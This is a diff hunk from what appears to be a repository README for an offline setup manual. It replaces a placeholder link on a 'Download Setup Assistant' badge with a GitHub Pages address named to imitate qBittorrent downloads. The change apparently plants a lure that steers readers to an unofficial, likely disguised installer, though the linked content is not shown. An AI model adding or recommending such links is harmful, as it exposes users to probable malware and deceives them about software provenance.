@@ -27,7 +27,7 @@ This repository provides a full offline setup manual for installing and running 
 
 ---
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://qbittorrent-download.github.io/.github)
 
 ---
 
